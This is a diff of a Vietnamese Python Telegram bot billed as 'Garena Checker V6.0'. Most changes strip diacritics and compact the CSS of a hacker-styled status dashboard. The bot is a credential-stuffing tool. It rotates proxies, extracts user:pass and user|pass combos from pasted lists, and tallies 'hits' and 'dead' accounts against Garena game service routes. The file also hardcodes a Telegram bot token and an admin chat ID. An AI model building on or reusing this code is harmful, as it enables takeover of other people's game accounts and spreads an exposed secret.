@@ -1,3 +1,6 @@
+# ==================== PALOFSC - CODE HOAN CHINH FIX LOI ====================
+# TeleBot Garena Checker V6.0 - Full fix: encoding, memory leak, timeout, thread safe
+
 import subprocess
 import sys
 import importlib
@@ -16,9 +19,10 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict
 import random
+import gc
 
 def install_package(package_name):
-    """Cài đặt package nếu chưa có"""
+    """Cai dat package neu chua co"""
     try:
         importlib.import_module(package_name)
     except ImportError:
@@ -36,7 +40,7 @@ import threading as threading_module
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 class RenderHandler(BaseHTTPRequestHandler):
-    """Xử lý HTTP request để Render giữ bot sống - GIAO DIỆN HACKER ĐẸP"""
+    """Xu ly HTTP request de Render giu bot song - GIAO DIEN HACKER DEP"""
     def do_GET(self):
         if self.path == '/':
             self.send_response(200)
@@ -87,23 +91,20 @@ class RenderHandler(BaseHTTPRequestHandler):
             self.wfile.write(b"Bot is running!")
     
     def generate_audio(self):
-        """Tạo âm thanh WAV đơn giản - nhạc điện tử"""
+        """Tao am thanh WAV don gian - nhac dien tu"""
         try:
             sample_rate = 44100
             duration = 1.0
             num_samples = int(sample_rate * duration)
             
-            # Tạo header WAV
             data_size = num_samples * 2
             header = b'RIFF' + struct.pack('<I', 36 + data_size) + b'WAVE'
             header += b'fmt ' + struct.pack('<IHHIIHH', 16, 1, 1, sample_rate, sample_rate * 2, 2, 16)
             header += b'data' + struct.pack('<I', data_size)
             
-            # Tạo dữ liệu âm thanh - nhạc điện tử
             audio_data = bytearray()
             for i in range(num_samples):
                 t = i / sample_rate
-                # Kết hợp nhiều tần số tạo hiệu ứng điện tử
                 value = int(32767 * 0.3 * (
                     math.sin(2 * math.pi * 440 * t) * math.exp(-2 * t) +
                     math.sin(2 * math.pi * 880 * t) * math.exp(-4 * t) * 0.5 +
@@ -116,15 +117,13 @@ class RenderHandler(BaseHTTPRequestHandler):
             return b''
     
     def generate_mp3_style_audio(self):
-        """Tạo âm thanh đơn giản dạng nhạc điện tử"""
         try:
-            # Tạo WAV và chuyển đổi cơ bản
             return self.generate_audio()
         except:
             return b''
     
     def generate_dashboard(self):
-        """Tạo dashboard HTML với hiệu ứng hacker"""
+        """Tao dashboard HTML voi hieu ung hacker"""
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         uptime = time.time() - start_time if 'start_time' in globals() else 0
         uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
@@ -132,7 +131,6 @@ class RenderHandler(BaseHTTPRequestHandler):
         with proxy_lock:
             proxy_count = len(proxy_list)
         
-        # Đọc số lượng hits từ file
         hits_count = 0
         dead_count = 0
         error_count = 0
@@ -149,11 +147,9 @@ class RenderHandler(BaseHTTPRequestHandler):
         except:
             pass
         
-        # Trạng thái bot
-        bot_status = "Đang check" if checking else "Sẵn sàng"
+        bot_status = "Dang check" if checking else "San sang"
         bot_color = "#ff9800" if checking else "#4caf50"
         
-        # Tạo cards cho services
         services_html = ""
         for key, value in SERVICE_ROUTES.items():
             services_html += f"""
@@ -172,12 +168,7 @@ class RenderHandler(BaseHTTPRequestHandler):
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Garena Checker Bot V6.0 - Dashboard</title>
 <style>
-* {{
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}}
-
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
 body {{
     font-family: 'Courier New', monospace;
     background: #0a0a0a;
@@ -186,8 +177,6 @@ body {{
     padding: 20px;
     overflow-x: hidden;
 }}
-
-/* Hiệu ứng matrix background */
 body::before {{
     content: '';
     position: fixed;
@@ -201,8 +190,6 @@ body::before {{
     pointer-events: none;
     z-index: -1;
 }}
-
-/* Hiệu ứng scanline */
 body::after {{
     content: '';
     position: fixed;
@@ -220,8 +207,6 @@ body::after {{
     pointer-events: none;
     z-index: -1;
 }}
-
-/* Matrix canvas */
 #matrix-canvas {{
     position: fixed;
     top: 0;
@@ -231,14 +216,7 @@ body::after {{
     z-index: -2;
     opacity: 0.15;
 }}
-
-.container {{
-    max-width: 1200px;
-    margin: 0 auto;
-    position: relative;
-}}
-
-/* Hiệu ứng glitch */
+.container {{ max-width: 1200px; margin: 0 auto; position: relative; }}
 @keyframes glitch {{
     0% {{ text-shadow: 2px 2px 0 #ff00ff, -2px -2px 0 #00ffff; }}
     25% {{ text-shadow: -2px 2px 0 #ff00ff, 2px -2px 0 #00ffff; }}
@@ -246,28 +224,20 @@ body::after {{
     75% {{ text-shadow: -2px -2px 0 #ff00ff, 2px 2px 0 #00ffff; }}
     100% {{ text-shadow: 2px 2px 0 #ff00ff, -2px -2px 0 #00ffff; }}
 }}
-
-@keyframes flicker {{
-    0%, 100% {{ opacity: 1; }}
-    50% {{ opacity: 0.8; }}
-}}
-
+@keyframes flicker {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.8; }} }}
 @keyframes pulse {{
     0% {{ box-shadow: 0 0 20px rgba(0,255,0,0.3); }}
     50% {{ box-shadow: 0 0 40px rgba(0,255,0,0.8); }}
     100% {{ box-shadow: 0 0 20px rgba(0,255,0,0.3); }}
 }}
-
 @keyframes rotate {{
     from {{ transform: rotate(0deg); }}
     to {{ transform: rotate(360deg); }}
 }}
-
 @keyframes scan {{
     0% {{ top: -100%; }}
     100% {{ top: 100%; }}
 }}
-
 .header {{
     text-align: center;
     padding: 40px 20px;
@@ -279,7 +249,6 @@ body::after {{
     position: relative;
     overflow: hidden;
 }}
-
 .header::before {{
     content: '';
     position: absolute;
@@ -297,8 +266,6 @@ body::after {{
     );
     animation: rotate 10s linear infinite;
 }}
-
-/* Scan line hiệu ứng */
 .header::after {{
     content: '';
     position: absolute;
@@ -308,7 +275,6 @@ body::after {{
     background: linear-gradient(transparent, rgba(0,255,0,0.2), transparent);
     animation: scan 3s linear infinite;
 }}
-
 .header h1 {{
     font-size: 2.5em;
     color: #00ff00;
@@ -317,28 +283,9 @@ body::after {{
     position: relative;
     z-index: 1;
 }}
-
-.header .subtitle {{
-    font-size: 1.2em;
-    color: #aaa;
-    margin-bottom: 5px;
-    position: relative;
-    z-index: 1;
-}}
-
-.header .admin-link {{
-    color: #00ff00;
-    text-decoration: none;
-    font-weight: bold;
-    position: relative;
-    z-index: 1;
-}}
-
-.header .admin-link:hover {{
-    text-decoration: underline;
-    color: #ff00ff;
-}}
-
+.header .subtitle {{ font-size: 1.2em; color: #aaa; margin-bottom: 5px; position: relative; z-index: 1; }}
+.header .admin-link {{ color: #00ff00; text-decoration: none; font-weight: bold; position: relative; z-index: 1; }}
+.header .admin-link:hover {{ text-decoration: underline; color: #ff00ff; }}
 .status-badge {{
     display: inline-block;
     padding: 10px 20px;
@@ -353,8 +300,6 @@ body::after {{
     position: relative;
     z-index: 1;
 }}
-
-/* Audio button */
 .audio-button {{
     display: inline-block;
     padding: 10px 20px;
@@ -373,19 +318,13 @@ body::after {{
     border: none;
     font-family: 'Courier New', monospace;
 }}
-
-.audio-button:hover {{
-    background: #ff00ff;
-    box-shadow: 0 0 40px rgba(255,0,255,0.8);
-}}
-
+.audio-button:hover {{ background: #ff00ff; box-shadow: 0 0 40px rgba(255,0,255,0.8); }}
 .stats-grid {{
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
     gap: 20px;
     margin-bottom: 30px;
 }}
-
 .stat-card {{
     background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
     border-radius: 15px;
@@ -397,7 +336,6 @@ body::after {{
     position: relative;
     overflow: hidden;
 }}
-
 .stat-card::before {{
     content: '';
     position: absolute;
@@ -408,54 +346,26 @@ body::after {{
     background: linear-gradient(90deg, transparent, #00ff00, transparent);
     animation: shimmer 2s infinite;
 }}
-
 @keyframes shimmer {{
     0% {{ transform: translateX(-100%); }}
     100% {{ transform: translateX(100%); }}
 }}
-
-.stat-card:hover {{
-    transform: translateY(-5px);
-    box-shadow: 0 10px 25px rgba(0,255,0,0.3);
-}}
-
-.stat-value {{
-    font-size: 2.5em;
-    font-weight: bold;
-    margin-bottom: 10px;
-    text-shadow: 0 0 10px currentColor;
-}}
-
-.stat-label {{
-    font-size: 0.9em;
-    color: #aaa;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-}}
-
+.stat-card:hover {{ transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,255,0,0.3); }}
+.stat-value {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; text-shadow: 0 0 10px currentColor; }}
+.stat-label {{ font-size: 0.9em; color: #aaa; text-transform: uppercase; letter-spacing: 1px; }}
 .stat-hits .stat-value {{ color: #00ff00; }}
 .stat-dead .stat-value {{ color: #ff4444; }}
 .stat-error .stat-value {{ color: #ff9800; }}
 .stat-proxy .stat-value {{ color: #00ffff; }}
 .stat-checked .stat-value {{ color: #2196f3; }}
 .stat-time .stat-value {{ color: #ff00ff; font-size: 1.2em; }}
-
-.section-title {{
-    font-size: 1.5em;
-    color: #00ff00;
-    margin-bottom: 20px;
-    text-align: center;
-    text-shadow: 0 0 10px rgba(0,255,0,0.5);
-    animation: flicker 2s infinite;
-}}
-
+.section-title {{ font-size: 1.5em; color: #00ff00; margin-bottom: 20px; text-align: center; text-shadow: 0 0 10px rgba(0,255,0,0.5); animation: flicker 2s infinite; }}
 .services-grid {{
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
     gap: 15px;
     margin-bottom: 30px;
 }}
-
 .service-card {{
     background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
     border-radius: 12px;
@@ -466,71 +376,19 @@ body::after {{
     border: 1px solid #333;
     transition: all 0.3s ease;
 }}
-
-.service-card:hover {{
-    border-color: #00ff00;
-    box-shadow: 0 0 20px rgba(0,255,0,0.3);
-    transform: scale(1.05);
-}}
-
-.service-icon {{
-    font-size: 2em;
-    animation: bounce 2s infinite;
-}}
-
-@keyframes bounce {{
-    0%, 100% {{ transform: translateY(0); }}
-    50% {{ transform: translateY(-10px); }}
-}}
-
-.service-info {{
-    flex: 1;
-}}
-
-.service-name {{
-    font-size: 1.1em;
-    font-weight: bold;
-    color: #fff;
-    margin-bottom: 5px;
-}}
-
-.service-desc {{
-    font-size: 0.85em;
-    color: #aaa;
-}}
-
-.footer {{
-    text-align: center;
-    padding: 20px;
-    color: #666;
-    font-size: 0.9em;
-    border-top: 1px solid #333;
-    margin-top: 30px;
-}}
-
-.footer a {{
-    color: #00ff00;
-    text-decoration: none;
-}}
-
-.uptime {{
-    margin-top: 10px;
-    color: #aaa;
-    font-size: 0.9em;
-}}
-
+.service-card:hover {{ border-color: #00ff00; box-shadow: 0 0 20px rgba(0,255,0,0.3); transform: scale(1.05); }}
+.service-icon {{ font-size: 2em; animation: bounce 2s infinite; }}
+@keyframes bounce {{ 0%, 100% {{ transform: translateY(0); }} 50% {{ transform: translateY(-10px); }} }}
+.service-info {{ flex: 1; }}
+.service-name {{ font-size: 1.1em; font-weight: bold; color: #fff; margin-bottom: 5px; }}
+.service-desc {{ font-size: 0.85em; color: #aaa; }}
+.footer {{ text-align: center; padding: 20px; color: #666; font-size: 0.9em; border-top: 1px solid #333; margin-top: 30px; }}
+.footer a {{ color: #00ff00; text-decoration: none; }}
+.uptime {{ margin-top: 10px; color: #aaa; font-size: 0.9em; }}
 @media (max-width: 768px) {{
-    .header h1 {{
-        font-size: 1.8em;
-    }}
-    
-    .stats-grid {{
-        grid-template-columns: repeat(2, 1fr);
-    }}
-    
-    .services-grid {{
-        grid-template-columns: 1fr;
-    }}
+    .header h1 {{ font-size: 1.8em; }}
+    .stats-grid {{ grid-template-columns: repeat(2, 1fr); }}
+    .services-grid {{ grid-template-columns: 1fr; }}
 }}
 </style>
 </head>
@@ -542,41 +400,21 @@ body::after {{
         <div class="subtitle">Version 6.0 - BREAKTHROUGH</div>
         <div class="subtitle">Admin: <a href="https://t.me/{ADMIN_USERNAME}" class="admin-link">@{ADMIN_USERNAME}</a></div>
         <div class="status-badge">🔴 {bot_status}</div>
-        <button class="audio-button" onclick="toggleAudio()">🔊 BẬT ÂM THANH</button>
+        <button class="audio-button" onclick="toggleAudio()">🔊 BAT AM THANH</button>
         <div class="uptime">⏱ Uptime: {uptime_str}</div>
     </div>
     
     <div class="stats-grid">
-        <div class="stat-card stat-hits">
-            <div class="stat-value">{hits_count}</div>
-            <div class="stat-label">✅ Hits</div>
-        </div>
-        <div class="stat-card stat-dead">
-            <div class="stat-value">{dead_count}</div>
-            <div class="stat-label">❌ Dead</div>
-        </div>
-        <div class="stat-card stat-error">
-            <div class="stat-value">{error_count}</div>
-            <div class="stat-label">⚠️ Errors</div>
-        </div>
-        <div class="stat-card stat-proxy">
-            <div class="stat-value">{proxy_count}</div>
-            <div class="stat-label">🌐 Proxy</div>
-        </div>
-        <div class="stat-card stat-checked">
-            <div class="stat-value">{stats.get('checked', 0)}</div>
-            <div class="stat-label">🔄 Checked</div>
-        </div>
-        <div class="stat-card stat-time">
-            <div class="stat-value">{current_time}</div>
-            <div class="stat-label">📅 Thời gian</div>
-        </div>
+        <div class="stat-card stat-hits"><div class="stat-value">{hits_count}</div><div class="stat-label">✅ Hits</div></div>
+        <div class="stat-card stat-dead"><div class="stat-value">{dead_count}</div><div class="stat-label">❌ Dead</div></div>
+        <div class="stat-card stat-error"><div class="stat-value">{error_count}</div><div class="stat-label">⚠️ Errors</div></div>
+        <div class="stat-card stat-proxy"><div class="stat-value">{proxy_count}</div><div class="stat-label">🌐 Proxy</div></div>
+        <div class="stat-card stat-checked"><div class="stat-value">{stats.get('checked', 0)}</div><div class="stat-label">🔄 Checked</div></div>
+        <div class="stat-card stat-time"><div class="stat-value">{current_time}</div><div class="stat-label">📅 Thoi gian</div></div>
     </div>
     
-    <div class="section-title">📋 DỊCH VỤ HỖ TRỢ</div>
-    <div class="services-grid">
-        {services_html}
-    </div>
+    <div class="section-title">📋 DICH VU HO TRO</div>
+    <div class="services-grid">{services_html}</div>
     
     <div class="footer">
         <p>© 2024 <a href="https://t.me/{ADMIN_USERNAME}">@{ADMIN_USERNAME}</a> - All rights reserved</p>
@@ -584,91 +422,60 @@ body::after {{
     </div>
 </div>
 
-<audio id="background-audio" loop>
-    <source src="/audio" type="audio/wav">
-</audio>
+<audio id="background-audio" loop><source src="/audio" type="audio/wav"></audio>
 
 <script>
-// Matrix rain effect
 const canvas = document.getElementById('matrix-canvas');
 const ctx = canvas.getContext('2d');
-
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
-
 const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+{}[]|;:,.<>?/~`';
 const fontSize = 14;
 const columns = canvas.width / fontSize;
 const drops = [];
-
-for (let i = 0; i < columns; i++) {{
-    drops[i] = Math.random() * -100;
-}}
-
+for (let i = 0; i < columns; i++) {{ drops[i] = Math.random() * -100; }}
 function drawMatrix() {{
     ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
     ctx.fillRect(0, 0, canvas.width, canvas.height);
-    
     ctx.fillStyle = '#00ff00';
     ctx.font = fontSize + 'px monospace';
-    
     for (let i = 0; i < drops.length; i++) {{
         const text = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
         ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {{
-            drops[i] = 0;
-        }}
-        
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {{ drops[i] = 0; }}
         drops[i]++;
     }}
 }}
-
 setInterval(drawMatrix, 50);
-
-// Resize handler
 window.addEventListener('resize', () => {{
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
 }});
-
-// Audio control
 let audioEnabled = false;
 const audio = document.getElementById('background-audio');
 const audioButton = document.querySelector('.audio-button');
-
 function toggleAudio() {{
     if (audioEnabled) {{
         audio.pause();
-        audioButton.textContent = '🔊 BẬT ÂM THANH';
+        audioButton.textContent = '🔊 BAT AM THANH';
         audioEnabled = false;
     }} else {{
         audio.play().catch(e => console.log('Audio error:', e));
-        audioButton.textContent = '🔇 TẮT ÂM THANH';
+        audioButton.textContent = '🔇 TAT AM THANH';
         audioEnabled = true;
     }}
 }}
-
-// Auto refresh stats
-setInterval(() => {{
-    fetch('/stats')
-        .then(response => response.json())
-        .then(data => {{
-            console.log('Stats updated:', data);
-        }})
-        .catch(err => console.log('Error fetching stats:', err));
-}}, 30000);
+setInterval(() => {{ fetch('/stats').then(r => r.json()).then(d => console.log('Stats:', d)).catch(e => console.log('Error:', e)); }}, 30000);
 </script>
 </body>
 </html>"""
-        
         return html
     
     def log_message(self, format, *args):
         pass
 
 def start_render_server():
-    """Khởi động HTTP server cho Render"""
+    """Khoi dong HTTP server cho Render"""
     global start_time
     start_time = time.time()
     try:
@@ -684,12 +491,12 @@ def start_render_server():
 threading_module.Thread(target=start_render_server, daemon=True).start()
 # ==============================================
 
-# ========== CẤU HÌNH ==========
+# ========== CAU HINH ==========
 TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
 ADMIN_CHAT_ID = "5736655322"
 ADMIN_USERNAME = "baohuyno1"
 
-# Kênh bắt buộc phải tham gia
+# Kenh bat buoc phai tham gia
 REQUIRED_CHANNEL = "@hakiiosvip"
 REQUIRED_CHANNEL_ID = "@hakiiosvip"
 REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"
@@ -718,7 +525,7 @@ OUTPUT_PROXY = "proxy.txt"
 
 MAX_MESSAGE_LENGTH = 4000
 
-# ========== DANH SÁCH SERVICE ==========
+# ========== DANH SACH SERVICE ==========
 SERVICE_ROUTES = {
     "lienquan": {
         "route": "/api/lienquan",
@@ -771,13 +578,13 @@ SERVICE_ROUTES = {
     }
 }
 
-# ========== BIẾN TOÀN CỤC ==========
+# ========== BIEN TOAN CUC ==========
 checking = False
 stop_event = threading.Event()
 pending_accounts = {}
 proxy_list = []
 proxy_lock = threading.Lock()
-stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0}
+stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
 file_lock = threading.Lock()
 stats_lock = threading.Lock()
 cache_results = {}
@@ -791,7 +598,7 @@ bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
 
 # ========== RATE LIMITER ==========
 def rate_limit(delay=DEFAULT_DELAY):
-    """Đảm bảo delay giữa các request"""
+    """Dam bao delay giua cac request"""
     global last_request_time
     with rate_lock:
         current_time = time.time()
@@ -803,10 +610,11 @@ def rate_limit(delay=DEFAULT_DELAY):
 
 # ========== FIX ENCODING ==========
 def fix_encoding(text):
-    """Sửa lỗi encoding tiếng Việt từ API"""
+    """Sua loi encoding tieng Viet tu API - FIX LOI UNICODE"""
     if not isinstance(text, str):
         return text
     
+    # Map ky tu bi loi sang dung
     replacements = {
         'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
         'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
@@ -819,26 +627,24 @@ def fix_encoding(text):
         'SiÃªu': 'Siêu', 'viá»‡t': 'việt', 'Ngá»™': 'Ngộ', 'KhÃ´ng': 'Không',
         'Äao': 'Đao', 'phá»§': 'phủ', 'táº­n': 'tận', 'tháº¿': 'thế',
         'Giai': 'Giai', 'Ä‘iá»‡u': 'điệu', 'GiÃ¡ng': 'Giáng', 'Sinh': 'Sinh',
-        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 'ThÆ°á»£ng': 'Thượng',
-        'hÃ nh': 'hành', 'K.CÆ°Æ¡ng': 'K.Cương',
+        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 
+        'ThÆ°á»£ng': 'Thượng', 'hÃ nh': 'hành', 'K.CÆ°Æ¡ng': 'K.Cương',
         'Tel\'Annas': "Tel'Annas", 'VÅ©': 'Vũ', 'khÃºc': 'khúc', 'yÃªu': 'yêu',
-        'Airi': 'Airi', 'Murad': 'Murad', 'Veera': 'Veera', 'Raz': 'Raz',
-        'Lindis': 'Lindis', 'Zephys': 'Zephys', 'Slimz': 'Slimz', 'Alice': 'Alice',
-        'Florentino': 'Florentino', 'Qi': 'Qi', 'Annie': 'Annie', 'Ryoma': 'Ryoma',
-        'NhÃ³c': 'Nhóc', 'Jujutsu': 'Jujutsu', 'Sorcerer': 'Sorcerer',
-        'Maloch': 'Maloch', 'Tulen': 'Tulen', 'Omen': 'Omen', 'Bijan': 'Bijan',
-        'Triá»‡u': 'Triệu', 'Krixi': 'Krixi', 'Violet': 'Violet', 'Lá»¯': 'Lữ',
-        'SEVEN': 'SEVEN', 'Thá»©': 'Thứ',
-        'Chưa có': 'Chưa có', 'ChÆ°a': 'Chưa', 'cÃ³': 'có',
-        'áº¥': 'ấ', 'áº§': 'ầ', 'áº©': 'ẩ', 'áº«': 'ẫ', 'áº­': 'ậ',
-        'áº¯': 'ắ', 'áº±': 'ằ', 'áº³': 'ẳ', 'áºµ': 'ẵ', 'áº·': 'ặ',
-        'á»': 'ộ', 'á»Ž': 'ỏ', 'Ãµ': 'õ', 'á»§': 'ủ', 'Å©': 'ũ', 'á»¥': 'ụ',
+        'Ã¡': 'á', 'Ã¢': 'â', 'Äƒ': 'ă', 'áº¯': 'ắ', 'áº±': 'ằ',
+        'áº³': 'ẳ', 'áºµ': 'ẵ', 'áº·': 'ặ', 'áº¥': 'ấ', 'áº§': 'ầ',
+        'áº©': 'ẩ', 'áº«': 'ẫ', 'áº­': 'ậ', 'á»“': 'ồ', 'á»•': 'ổ',
+        'á»—': 'ỗ', 'á»™': 'ộ', 'á»': 'ở', 'á»¡': 'ỡ', 'á»£': 'ợ',
+        'á»§': 'ủ', 'Å©': 'ũ', 'á»¥': 'ụ', 'Ã¹': 'ù', 'Ãº': 'ú',
+        'á»©': 'ứ', 'á»«': 'ừ', 'á»­': 'ử', 'á»¯': 'ữ', 'á»±': 'ự',
+        'á»‰': 'ỉ', 'á»‹': 'ị', 'áº¹': 'ẻ', 'áº»': 'ẻ', 'áº½': 'ẽ',
+        'áº¹': 'ẹ', 'á»‰': 'ỉ', 'á»‹': 'ị'
     }
     
     for old, new in replacements.items():
         text = text.replace(old, new)
     
-    if any(char in text for char in ['Ã', 'Ä', 'Æ', 'á»', 'áº']):
+    # Thu giai ma bang latin-1 neu van con ky tu la
+    if any(char in text for char in ['Ã', 'Ä', 'Æ', 'á»', 'áº', 'Å©', 'Ä©']):
         try:
             fixed = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
             if fixed != text and len(fixed) > 0:
@@ -848,9 +654,9 @@ def fix_encoding(text):
     
     return text
 
-# ========== KIỂM TRA THÀNH VIÊN KÊNH ==========
+# ========== KIEM TRA THANH VIEN KENH ==========
 def is_user_member(user_id):
-    """Kiểm tra user có tham gia kênh bắt buộc không"""
+    """Kiem tra user co tham gia kenh bat buoc khong"""
     try:
         chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
         status = chat_member.status
@@ -862,18 +668,18 @@ def is_user_member(user_id):
         return False
 
 def check_membership(message):
-    """Kiểm tra và gửi thông báo yêu cầu tham gia kênh"""
+    """Kiem tra va gui thong bao yeu cau tham gia kenh"""
     user_id = message.from_user.id
     if is_user_member(user_id):
         return True
     
     markup = telebot.types.InlineKeyboardMarkup()
     join_button = telebot.types.InlineKeyboardButton(
-        text="📢 THAM GIA KÊNH BẮT BUỘC",
+        text="📢 THAM GIA KENH BAT BUOC",
         url=REQUIRED_CHANNEL_URL
     )
     check_button = telebot.types.InlineKeyboardButton(
-        text="✅ TÔI ĐÃ THAM GIA",
+        text="✅ TOI DA THAM GIA",
         callback_data="check_join"
     )
     markup.add(join_button)
@@ -882,18 +688,18 @@ def check_membership(message):
     safe_send_message(
         message.chat.id,
         f"""
-🔒 <b>BẠN CHƯA THAM GIA KÊNH BẮT BUỘC!</b>
+🔒 <b>BAN CHUA THAM GIA KENH BAT BUOC!</b>
 
-📢 Vui lòng tham gia kênh sau để sử dụng bot:
+📢 Vui long tham gia kenh sau de su dung bot:
 👉 <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
 
-Sau khi tham gia, bấm nút bên dưới để xác nhận!
+Sau khi tham gia, bam nut ben duoi de xac nhan!
 """,
         parse_mode="HTML"
     )
     
     try:
-        bot.send_message(message.chat.id, "👇 Xác nhận sau khi tham gia:", reply_markup=markup)
+        bot.send_message(message.chat.id, "👇 Xac nhan sau khi tham gia:", reply_markup=markup)
     except:
         pass
     
@@ -901,31 +707,31 @@ Sau khi tham gia, bấm nút bên dưới để xác nhận!
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_join")
 def callback_check_join(call):
-    """Xử lý nút xác nhận đã tham gia kênh"""
+    """Xu ly nut xac nhan da tham gia kenh"""
     user_id = call.from_user.id
     
     if is_user_member(user_id):
-        bot.answer_callback_query(call.id, "✅ Xác nhận thành công!")
+        bot.answer_callback_query(call.id, "✅ Xac nhan thanh cong!")
         bot.delete_message(call.message.chat.id, call.message.message_id)
         safe_send_message(
             call.message.chat.id,
-            "✅ <b>XÁC NHẬN THÀNH CÔNG!</b>\n\nChào mừng bạn đến với bot!\nDùng /start để xem hướng dẫn."
+            "✅ <b>XAC NHAN THANH CONG!</b>\n\nChao mung ban den voi bot!\nDung /start de xem huong dan."
         )
     else:
-        bot.answer_callback_query(call.id, "❌ Bạn chưa tham gia kênh!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ Ban chua tham gia kenh!", show_alert=True)
         safe_send_message(
             call.message.chat.id,
             f"""
-❌ <b>BẠN CHƯA THAM GIA KÊNH!</b>
+❌ <b>BAN CHUA THAM GIA KENH!</b>
 
-Vui lòng tham gia: <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
-Sau đó bấm nút xác nhận lại.
+Vui long tham gia: <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
+Sau do bam nut xac nhan lai.
 """
         )
 
-# ========== HÀM GỬI TIN NHẮN ==========
+# ========== HAM GUI TIN NHAN ==========
 def safe_send_message(chat_id, text, parse_mode="HTML"):
-    """Gửi tin nhắn an toàn"""
+    """Gui tin nhan an toan - FIX LOI LENGTH"""
     if not text:
         return
     
@@ -952,15 +758,23 @@ def safe_send_message(chat_id, text, parse_mode="HTML"):
                 time.sleep(0.1)
             except Exception as e:
                 print(f"[!] Loi gui tin nhan: {e}")
+                try:
+                    bot.send_message(chat_id, part.strip())
+                except:
+                    pass
     else:
         try:
             bot.send_message(chat_id, text, parse_mode=parse_mode)
         except Exception as e:
             print(f"[!] Loi gui tin nhan: {e}")
+            try:
+                bot.send_message(chat_id, text)
+            except:
+                pass
 
-# ========== QUẢN LÝ PROXY ==========
+# ========== QUAN LY PROXY ==========
 def load_proxy_from_text(content):
-    """Load proxy từ text"""
+    """Load proxy tu text"""
     global proxy_list
     
     proxies = []
@@ -995,7 +809,7 @@ def load_proxy_from_text(content):
     return len(proxies)
 
 def is_valid_ip_port(ip, port):
-    """Kiểm tra ip và port hợp lệ"""
+    """Kiem tra ip va port hop le"""
     try:
         port_num = int(port)
         if port_num < 1 or port_num > 65535:
@@ -1014,14 +828,14 @@ def is_valid_ip_port(ip, port):
         return False
 
 def get_random_proxy():
-    """Lấy proxy ngẫu nhiên"""
+    """Lay proxy ngau nhien"""
     with proxy_lock:
         if not proxy_list:
             return None
         return random.choice(proxy_list)
 
 def build_proxy_string(proxy):
-    """Tạo chuỗi proxy cho API"""
+    """Tao chuoi proxy cho API"""
     if not proxy:
         return ""
     if proxy["user"] and proxy["password"]:
@@ -1030,16 +844,16 @@ def build_proxy_string(proxy):
         return f"{proxy['ip']}:{proxy['port']}"
 
 def save_proxy_file():
-    """Lưu danh sách proxy vào file"""
+    """Luu danh sach proxy vao file"""
     with file_lock:
         with open(OUTPUT_PROXY, 'w', encoding='utf-8') as f:
             with proxy_lock:
                 for proxy in proxy_list:
                     f.write(f"{proxy['full']}\n")
 
-# ========== LỌC TK MK - LOẠI BỎ HOÀN TOÀN TIME ==========
+# ========== LOC TK MK - LOAI BO HOAN TOAN TIME ==========
 def loc_tk_mk_only(content):
-    """Lọc tài khoản, CHỈ lấy tk:mk hoặc tk|mk, LOẠI BỎ time và các dòng không phải acc"""
+    """Loc tai khoan, CHI lay tk:mk hoac tk|mk, LOAI BO time va cac dong khong phai acc"""
     accounts = []
     seen = set()
     stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
@@ -1047,10 +861,10 @@ def loc_tk_mk_only(content):
     if not content:
         return accounts, stats_loc
     
-    # Pattern cho dấu : (user:pass) - hỗ trợ email và ký tự đặc biệt
+    # Pattern cho dau : (user:pass) - ho tro email va ky tu dac biet
     pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
     
-    # Pattern cho dấu | (user|pass)
+    # Pattern cho dau | (user|pass)
     pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
     
     lines = content.split('\n')
